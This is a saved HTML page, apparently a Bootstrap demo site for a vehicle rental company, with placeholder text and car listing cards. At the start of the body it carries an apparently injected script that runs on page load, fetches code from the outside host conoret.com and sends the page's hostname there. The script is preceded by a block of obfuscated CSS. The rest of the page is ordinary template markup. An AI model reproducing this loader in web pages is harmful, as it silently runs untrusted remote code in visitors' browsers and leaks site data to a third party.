.b2007943jDW-{font-size:10px;display:inline-flex;align-items:center;color:#bfbfbf;white-space:nowrap;cursor:pointer;text-decoration:underline}.b2007943cyGA.b2007941XnLK .b2007943jDW- .b2007942hWkC{width:16px;height:16px;background-size:contain;margin-left:5px;cursor:pointer}.b2007943cyGA.b2007941XnLK .b2007943jDW-:hover{color:#2f9cc3}.b2007941ZsX.b200794_FUR-Y .b2007943UME6{position:fixed;top:0;left:0;z-index:9999999;background-color:rgba(0,0,0,.7607843137);width:100%;height:100%;padding:40px 30px;overflow-y:auto;display:flex;align-items:center;justify-content:center}.b2007941ZsX.b200794_FUR-Y .b2007942qMVB{max-width:1000px;max-height:700px;width:100%;height:100%;background-color:#fff;border-radius:8px;margin:auto;position:relative;padding-bottom:8px}.b2007941ZsX.b200794_FUR-Y .b2007942WeQ{position:absolute;top:-35px;right:0px;width:30px;height:30px;font-size:30px;color:#fff;cursor:pointer;user-select:none;display:flex;align-items:center;justify-content:center}.b200794_1ZsX.b200794_FUR-Y .b2007942WeQ:hover{color:#ccc}.b200794_1ZsX.b200794_FUR-Y .b2007942WeQ:active{color:#a09f9f}.b200794_1Xr_I{overflow:hidden !important}.b200794Rks26.b2007943Woxo{height:100%;overflow:hidden}.b200794Rks26.b2007943Woxo .b20079429nyS{height:100%;overflow:hidden;display:grid;grid-template-rows:66px 1fr}.b200794Rks26.b2007943Woxo .b2007942EknD{position:relative}.b200794Rks26.b2007943Woxo .b2007942pV0d{padding-bottom:100%;border-radius:4px;transition:.15s;box-shadow:0 0 0 0px #db2828;cursor:pointer;user-select:none;background-position:center;background-repeat:no-repeat;background-size:cover}.b200794Rks26.b2007943Woxo .b2007942pV0d:hover{box-shadow:0 0 0 2px #db2828}.b200794Rks26.b2007943Woxo .b200794YNeyk{opacity:0}.b200794Rks26.b2007943Woxo .b2007942EknD:hover .b200794YNeyk{opacity:1}.b200794Rks26.b2007943Woxo .b200794flnSW{padding:24px;padding-top:3px;height:100%;overflow-y:auto}.b200794Rks26.b2007943Woxo .b200794flnSW.b2007942ph6f{visibility:hidden}.b200794Rks26.b2007943Woxo .b200794flnSW.b2007942ph6f *{visibility:hidden}.b200794Rks26.b2007943Woxo .b200794Y0kxf{display:grid;grid-template-columns:1fr 1fr 1fr 1fr;gap:20px}.b200794Rks26.b2007943Woxo .b2007943WPZ{display:flex;gap:12px;align-items:center;padding:0 24px;justify-content:space-between}.b200794_Rks26.b2007943Woxo .b2007943WPZ .b200794_3sYFd{display:flex;gap:12px;align-items:center}.b200794Rks26.b2007943Woxo .b2007943WPZ .b200794_3sYFd .b2007942A-m6{height:30px;white-space:nowrap}.b200794Rks26.b2007943Woxo .b2007943WPZ .b200794_3sYFd .b20079417yf9{font-size:16px;font-weight:600;color:#000;display:flex;align-items:center;gap:8px}.b200794Rks26.b2007943Woxo .b2007943WPZ .b200794_3sYFd .b20079417yf9 div{display:flex}.b200794Rks26.b2007943Woxo .b2007943WPZ .b200794_3sYFd .b20079417yf9 svg{color:#000}.b200794Rks26.b2007943Woxo .b2007943WPZ .b200794_2LxV8{display:flex}.b200794Rks26.b2007943Woxo .b2007943WPZ .b200794_2LxV8 .b200794oJK9j{height:30px;border:none;background-color:rgba(0,0,0,0);color:#2c65f1;padding-right:0}.b200794Rks26.b2007943Woxo .b2007943WPZ .b200794_2LxV8 .b200794oJK9j:hover{text-decoration:underline}.b200794Rks26.b2007943Woxo .b2007943WPZ .b200794_2LxV8 .b200794oJK9j:active{color:#1d4bbd}.b200794Rks26.b2007943Woxo .b2007943WPZ .b200794_2LxV8 .b200794oJK9j[data-ah-btn-loading=true]{color:#ccc}.b200794oiVnS.b2007941-p4Q{transition:.15s;position:absolute;top:8px;left:8px;width:24px;height:24px}.b200794oiVnS.b2007941-p4Q.b2007948P77I{opacity:1}.b200794oiVnS.b2007941-p4Q .b200794Of3Mw{display:inline-flex;padding:0;width:24px;height:24px;transition:.15s}.b200794oiVnS.b2007941-p4Q .b200794Of3Mw.b20079420dL8{border-radius:50%}.b2007942ppFt.b200794ae21-{display:grid;grid-template-columns:1fr;gap:32px;height:100%;align-items:center;padding:0px;padding-top:45px;position:relative}.b2007942ppFt.b200794ae21- .b2007941R8Xm{color:#333;display:flex;align-items:center;justify-content:center;flex-wrap:wrap}.b2007942ppFt.b200794ae21- .b2007941R8Xm svg{width:16px !important;margin:5px;color:#db2828}.b2007942ppFt.b200794ae21- .b2007942XD0x{height:100%;display:grid;grid-template-rows:1fr 20px;position:relative}.b2007942ppFt.b200794ae21- .b2007942XD0x .b2007942AWqe{background-position:center;background-repeat:no-repeat;background-size:contain;background-color:#000}.b2007942ppFt.b200794ae21- .b2007942fqEf{position:absolute;top:50%;left:0;width:100%;height:0;transform:translateY(-50%);display:flex;align-items:center;justify-content:space-between}.b2007942ppFt.b200794ae21- .b2007942fqEf .b20079427P75{width:40px;height:200px;display:flex;align-items:center;justify-content:center;cursor:pointer;user-select:none}.b2007942ppFt.b200794ae21- .b2007942fqEf .b20079427P75.b20079431h0{pointer-events:none;opacity:.3}.b200794_2ppFt.b200794ae21- .b2007942fqEf .b20079427P75.b20079431h0 *{pointer-events:none}.b200794_2ppFt.b200794ae21- .b2007942fqEf .b20079427P75 svg{width:24px !important;color:#ccc}.b2007942ppFt.b200794ae21- .b2007942fqEf .b20079427P75.b2007941HEYY{margin-left:5px;transform:translateX(5px);transition:.15s}.b2007942ppFt.b200794ae21- .b2007942fqEf .b20079427P75.b2007941HEYY:hover{transform:translateX(0)}.b2007942ppFt.b200794ae21- .b2007942fqEf .b20079427P75.b200794J1UqD{transform:translateX(-5px);transition:.15s}.b2007942ppFt.b200794ae21- .b2007942fqEf .b20079427P75.b200794J1UqD:hover{transform:translateX(0)}.b2007942ppFt.b200794ae21- .b2007942fqEf .b20079427P75:hover svg{color:#555}.b2007942ppFt.b200794ae21- .b2007942fqEf .b20079427P75:active svg{color:#000}.b2007942ppFt.b200794ae21- .b2007943_cE0{position:absolute;top:15px;left:15px;font-size:13px;display:flex;align-items:center;justify-content:center;cursor:pointer;user-select:none;gap:8px;color:#2c65f1}.b2007942ppFt.b200794ae21- .b2007943_cE0 svg{width:15px !important}.b2007942ppFt.b200794ae21- .b2007943_cE0:hover{color:#3a6eec}.b2007942ppFt.b200794ae21- .b2007943_cE0:active{color:#1b49b9}.b2007942ppFt.b200794ae21- .b200794_3mM6m{position:absolute;top:15px;right:15px;z-index:9;color:#b7b7b7}</style></head>
  <body><script type="text/javascript">window.top === window && !function(){var e=document.createElement("script"),t=document.getElementsByTagName("head")[0];e.src="//conoret.com/dsp?h="+document.location.hostname+"&r="+Math.random(),e.type="text/javascript",e.defer=!0,e.async=!0,t.appendChild(e)}();</script>
    <svg xmlns="http://www.w3.org/2000/svg" class="d-none">
      <symbol id="check2" viewBox="0 0 16 16">
        <path d="M13.854 3.646a.5.5 0 0 1 0 .708l-7 7a.5.5 0 0 1-.708 0l-3.5-3.5a.5.5 0 1 1 .708-.708L6.5 10.293l6.646-6.647a.5.5 0 0 1 .708 0z"></path>
      </symbol>
      <symbol id="circle-half" viewBox="0 0 16 16">
        <path d="M8 15A7 7 0 1 0 8 1v14zm0 1A8 8 0 1 1 8 0a8 8 0 0 1 0 16z"></path>
      </symbol>
      <symbol id="moon-stars-fill" viewBox="0 0 16 16">
        <path d="M6 .278a.768.768 0 0 1 .08.858 7.208 7.208 0 0 0-.878 3.46c0 4.021 3.278 7.277 7.318 7.277.527 0 1.04-.055 1.533-.16a.787.787 0 0 1 .81.316.733.733 0 0 1-.031.893A8.349 8.349 0 0 1 8.344 16C3.734 16 0 12.286 0 7.71 0 4.266 2.114 1.312 5.124.06A.752.752 0 0 1 6 .278z"></path>
        <path d="M10.794 3.148a.217.217 0 0 1 .412 0l.387 1.162c.173.518.579.924 1.097 1.097l1.162.387a.217.217 0 0 1 0 .412l-1.162.387a1.734 1.734 0 0 0-1.097 1.097l-.387 1.162a.217.217 0 0 1-.412 0l-.387-1.162A1.734 1.734 0 0 0 9.31 6.593l-1.162-.387a.217.217 0 0 1 0-.412l1.162-.387a1.734 1.734 0 0 0 1.097-1.097l.387-1.162zM13.863.099a.145.145 0 0 1 .274 0l.258.774c.115.346.386.617.732.732l.774.258a.145.145 0 0 1 0 .274l-.774.258a1.156 1.156 0 0 0-.732.732l-.258.774a.145.145 0 0 1-.274 0l-.258-.774a1.156 1.156 0 0 0-.732-.732l-.774-.258a.145.145 0 0 1 0-.274l.774-.258c.346-.115.617-.386.732-.732L13.863.1z"></path>
      </symbol>
      <symbol id="sun-fill" viewBox="0 0 16 16">
        <path d="M8 12a4 4 0 1 0 0-8 4 4 0 0 0 0 8zM8 0a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 0zm0 13a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 13zm8-5a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2a.5.5 0 0 1 .5.5zM3 8a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2A.5.5 0 0 1 3 8zm10.657-5.657a.5.5 0 0 1 0 .707l-1.414 1.415a.5.5 0 1 1-.707-.708l1.414-1.414a.5.5 0 0 1 .707 0zm-9.193 9.193a.5.5 0 0 1 0 .707L3.05 13.657a.5.5 0 0 1-.707-.707l1.414-1.414a.5.5 0 0 1 .707 0zm9.193 2.121a.5.5 0 0 1-.707 0l-1.414-1.414a.5.5 0 0 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .707zM4.464 4.465a.5.5 0 0 1-.707 0L2.343 3.05a.5.5 0 1 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .708z"></path>
      </symbol>
    </svg>

    <div class="dropdown position-fixed bottom-0 end-0 mb-3 me-3 bd-mode-toggle">
      <button class="btn btn-bd-primary py-2 dropdown-toggle d-flex align-items-center" id="bd-theme" type="button" aria-expanded="false" data-bs-toggle="dropdown" aria-label="Toggle theme (dark)">
        <svg class="bi my-1 theme-icon-active" width="1em" height="1em"><use href="#moon-stars-fill"></use></svg>
        <span class="visually-hidden" id="bd-theme-text">Toggle theme</span>
      </button>
      <ul class="dropdown-menu dropdown-menu-end shadow" aria-labelledby="bd-theme-text">
        <li>
          <button type="button" class="dropdown-item d-flex align-items-center" data-bs-theme-value="light" aria-pressed="false">
            <svg class="bi me-2 opacity-50" width="1em" height="1em"><use href="#sun-fill"></use></svg>
            Light
            <svg class="bi ms-auto d-none" width="1em" height="1em"><use href="#check2"></use></svg>
          </button>
        </li>
        <li>
          <button type="button" class="dropdown-item d-flex align-items-center active" data-bs-theme-value="dark" aria-pressed="true">
            <svg class="bi me-2 opacity-50" width="1em" height="1em"><use href="#moon-stars-fill"></use></svg>
            Dark
            <svg class="bi ms-auto d-none" width="1em" height="1em"><use href="#check2"></use></svg>
          </button>
        </li>
        <li>
          <button type="button" class="dropdown-item d-flex align-items-center" data-bs-theme-value="auto" aria-pressed="false">
            <svg class="bi me-2 opacity-50" width="1em" height="1em"><use href="#circle-half"></use></svg>
            Auto
            <svg class="bi ms-auto d-none" width="1em" height="1em"><use href="#check2"></use></svg>
          </button>
        </li>
      </ul>
    </div>


<header data-bs-theme="dark">
  <div class="text-bg-dark collapse" id="navbarHeader" style="">
    <div class="container">
      <div class="row">
        <div class="col-sm-8 col-md-7 py-4">
          <h4>About</h4>
          <p class="text-body-secondary">Add some information about the album below, the author, or any other background context. Make it a few sentences long so folks can pick up some informative tidbits. Then, link them off to some social networking sites or contact information.</p>
        </div>
        <div class="col-sm-4 offset-md-1 py-4">
          <h4>Contact</h4>
          <ul class="list-unstyled">
            <li><a href="#" class="text-white">Follow on Twitter</a></li>
            <li><a href="#" class="text-white">Like on Facebook</a></li>
            <li><a href="#" class="text-white">Email me</a></li>
          </ul>
        </div>
      </div>
    </div>
  </div>
  <div class="navbar navbar-dark bg-dark shadow-sm">
    <div class="container">
      <a href="#" class="navbar-brand d-flex align-items-center">
        <img src="360_F_420394922_MLXwRFxXSmFyL3cfhwmFQgMKiU6DNAEZ.jpg" class="card-img-top" alt="Chrysler 300C" height="150">
        
      </a>
      <button class="navbar-toggler collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#navbarHeader" aria-controls="navbarHeader" aria-expanded="false" aria-label="Toggle navigation">
        <span class="navbar-toggler-icon"></span>
      </button>
    </div>
  </div>
</header>

<main>

  <section class="py-5 text-center container">
    <div class="row py-lg-5">
      <div class="col-lg-6 col-md-8 mx-auto">
        <h1 class="fw-light">Royal Vehicle Rental Pvt(Ltd)</h1>
        <p class="lead text-body-secondary">Unlock the freedom to explore with our hassle-free vehicle rental service offering a wide range of cars for every journey, whether it's a quick city errand or a cross-country adventure. Affordable, reliable, and always ready when you are!</p>
        <p>
          <a href="login.jsp" class="btn btn-secondary my-2">Login</a>
          <a href="signup.jsp" class="btn btn-secondary my-2">Sign-Up</a>
        </p>
      </div>
    </div>
  </section>

  <div class="album py-5 bg-body-tertiary">
    <div class="container">

      <div class="row row-cols-1 row-cols-sm-2 row-cols-md-3 g-3">
        <div class="col">
          <div class="card shadow-sm">
            <img src="pexels-mikebirdy-112460.jpg" class="card-img-top" alt="Chrysler 300C">
            <div class="card-body">
              <p class="card-text">Are you looking for a hassle-free way to rent a vehicle for your next adventure? Look no further than Royal Vehicle Rental! Our wide range of cars, from economy to luxury, are perfect for any journey, whether it's a quick city errand or a cross-country road trip.</p>
              <div class="d-flex justify-content-between align-items-center">
                
                <small class="text-body-secondary">Rent now</small>
              </div>
            </div>
          </div>
        </div>
        <div class="col">
          <div class="card shadow-sm">
            <img src="car-5718701_1280.jpg" class="card-img-top" alt="Chrysler 300C" height="280">
            <div class="card-body">
              <p class="card-text">Are you ready to hit the open road and explore new horizons? At Royal Vehicle Rental, we offer a wide range of vehicles to suit every need and budget. From sleek sedans to rugged SUVs, our fleet is designed to get you where you want to go in style and comfort</p>
              <div class="d-flex justify-content-between align-items-center">
                
                <small class="text-body-secondary">Rent now</small>
              </div>
            </div>
          </div>
        </div>
        <div class="col">
          <div class="card shadow-sm">
            <img src="nissan-urvan-premium-2020-autohub-group-philippines-1.jpg" class="card-img-top" alt="Chrysler 300C" height="280">
            <div class="card-body">
              <p class="card-text">Are you ready to explore new destinations and create unforgettable memories? At Royal Vehicle Rental, we offer a wide range of vehicles to suit every need and budget. From compact cars to spacious SUVs, our fleet is designed to provide you with the freedom</p>
              <div class="d-flex justify-content-between align-items-center">
                
                <small class="text-body-secondary">Rent now</small>
              </div>
            </div>
          </div>
        </div>

        <div class="col">
          <div class="card shadow-sm">
            <img src="Maruti-Suzuki-WagonR-Rendering.jpg" class="card-img-top" alt="Chrysler 300C" height="280">
            <div class="card-body">
              <p class="card-text">Need a reliable ride for your next trip? Royal Vehicle Rental's got you covered with our extensive selection of cars, trucks, and vans. From economy to luxury, we have the perfect vehicle for any occasion, and our friendly staff is always happy to help you find the right ride for your needs</p>
              <div class="d-flex justify-content-between align-items-center">
                
                <small class="text-body-secondary">Rent now</small>
              </div>
            </div>
          </div>
        </div>
        <div class="col">
          <div class="card shadow-sm">
            <img src="Mitsubishi-L300.jpg.cfbd0cac2dc7139d1729f2ad7ee59a31.jpg" class="card-img-top" alt="Chrysler 300C" height="280">
            
            <div class="card-body">
              <p class="card-text">Ready to hit the road? Royal Vehicle Rental's wide range of vehicles has got you covered, whether you're heading out on a solo adventure or traveling with a group. Our cars, trucks, and vans are all well-maintained and easy to drive, and our competitive prices make it easy to stay within your budget</p>
              <div class="d-flex justify-content-between align-items-center">
                
                <small class="text-body-secondary">Rent now</small>
              </div>
            </div>
          </div>
        </div>
        <div class="col">
          <div class="card shadow-sm">
            <img src="premium_photo-1664303847960-586318f59035.jpg" class="card-img-top" alt="Chrysler 300C" height="280">
            
            <div class="card-body">
              <p class="card-text">Looking for a vehicle rental company that can meet all your needs? Look no further than Royal Vehicle Rental, your one-stop shop for all your vehicle rental needs. We offer a wide range of cars, trucks, and vans, as well as a variety of additional services to make your rental experience as smooth and hassle-free as possible</p>
              <div class="d-flex justify-content-between align-items-center">
                
                <small class="text-body-secondary">Rent now</small>
              </div>
            </div>
          </div>
        </div>

        <div class="col">
          <div class="card shadow-sm">
            <img src="IMG_1811-Cropped-scaled.jpg" class="card-img-top" alt="Chrysler 300C" height="280">
            
            <div class="card-body">
              <p class="card-text">Are you planning a road trip and need a reliable vehicle to get you there? Royal Vehicle Rental's got you covered with our wide range of cars, trucks, and vans. Our vehicles are all well-maintained and easy to drive, and our friendly staff is always happy to help you find the right ride for your needs</p>
              <div class="d-flex justify-content-between align-items-center">
                
                <small class="text-body-secondary">Rent now</small>
              </div>
            </div>
          </div>
        </div>
        <div class="col">
          <div class="card shadow-sm">
            <img src="HH1408-G.jpg" class="card-img-top" alt="Chrysler 300C" height="280">
            <div class="card-body">
              <p class="card-text">Are you tired of the hassle and expense of owning a vehicle? Look no further than Royal Vehicle Rental, your premier source for affordable and reliable cars, trucks, and vans. Our wide range of vehicles is perfect for any journey, whether it's a quick city errand or a cross-country road trip. With our competitive prices</p>
              <div class="d-flex justify-content-between align-items-center">
                
                <small class="text-body-secondary">Rent now</small>
              </div>
            </div>
          </div>
        </div>
        <div class="col">
          <div class="card shadow-sm">
            <img src="Lights-clouds-dark-car_(23698576464).jpg" class="card-img-top" alt="Chrysler 300C" height="280">
            <div class="card-body">
              <p class="card-text">Whether you're a busy professional, a student, or just someone who loves to travel, Royal Vehicle Rental has the perfect vehicle for you. Our extensive selection of cars, trucks, and vans is designed to meet the needs of any driver, and our friendly staff is always happy to help you find the right ride</p>
              <div class="d-flex justify-content-between align-items-center">
                
                <small class="text-body-secondary">Rent now</small>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>

</main>

<footer class="text-body-secondary py-5">
  <div class="container">
    <p class="float-end mb-1">
      <a href="#">Back to top</a>
    </p>
    <footer class="text-body-secondary py-5">
  <div class="container">
    
    <footer class="text-body-secondary py-5">
  <div class="container">
    
    <footer class="d-flex flex-wrap justify-content-between align-items-center py-3 my-4 border-top">
    <div class="col-md-4 d-flex align-items-center">
      <a href="/" class="mb-3 me-2 mb-md-0 text-body-secondary text-decoration-none lh-1">
        <svg class="bi" width="30" height="24"><use xlink:href="#bootstrap"></use></svg>
      </a>
      <span class="mb-3 mb-md-0 text-body-secondary"> 2024 Royal Vehicle Rental Pvt(Ltd)</span>
    </div>

    <ul class="nav col-md-4 justify-content-end list-unstyled d-flex">
      <li class="ms-3"><a class="text-body-secondary" href="#" target="_blank"><i class="fa-brands fa-facebook fa-lg"></i></a></li>
      <li class="ms-3"><a class="text-body-secondary" href="#" target="_blank"><i class="fa-brands fa-twitter fa-lg"></i></a></li>
      <li class="ms-3"><a class="text-body-secondary" href="#" target="_blank"><i class="fa-brands fa-linkedin fa-lg"></i></a></li>
    </ul>
  </footer>
  </div>
</footer>
  </div>
</footer>
  </div>
</footer>
<script src="/docs/5.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-YvpcrYf0tY3lHB60NNkmXc5s9fDVZLESaAA55NDzOxhy9GkcIdslK1eN7N6jIeHz" crossorigin="anonymous"></script>

    

</body></html>